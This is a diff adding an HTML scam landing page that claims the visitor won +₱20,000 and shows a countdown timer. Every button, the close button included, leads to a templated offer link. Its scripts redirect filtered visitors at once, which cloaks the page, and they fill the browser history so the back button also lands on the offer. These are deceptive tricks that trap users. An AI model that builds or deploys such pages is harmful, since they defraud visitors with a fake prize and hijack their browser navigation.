@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations</title>
+    <link href="css/main.css" rel="stylesheet" type="text/css">
+    <script src="js/i18n.js"></script>
+    <script>
+      const offerLink = '{offer_link}&to_offer=1';
+      const urlParams = new URLSearchParams(window.location.search);
+      const countryParam = urlParams.get('country');
+    
+      if (!countryParam || !geoContent[countryParam.toUpperCase()]) {
+        location.replace(offerLink); // моментальный редирект без отображения
+      }
+    </script>
+    <script>
+      ! function() {
+          var t;
+          try {
+              for (t = 0; 10 > t; ++t) history.pushState({}, "");
+                  onpopstate = function(t) {
+                      t.state && location.replace("{offer_link}&to_offer=2");
+                  }
+          } catch (o) {}
+      }();
+    </script>
+</head>
+<body>
+  <div class="modal">
+    <div class="close-btn" onclick="window.location.href='{offer_link}&to_offer=1'">×</div>
+    <h1 id="title">Congratulations!</h1>
+    <p id="amount">You won +₱20,000</p>
+    <p id="instruction">Simply click 👉 CASH OUT👈 to get your money!</p>
+    <div class="timer"><span id="timer">01:00</span></div>
+    <div class="buttons">
+      <button id="infoBtn" class="btn info" onclick="window.location.href='{offer_link}&to_offer=1'">INFO</button>
+      <button id="cashoutBtn" class="btn cashout" onclick="window.location.href='{offer_link}&to_offer=1'">CASH OUT</button>
+    </div>
+  </div>
+  <script src="js/timer.js"></script>
+
+</body>
+</html>
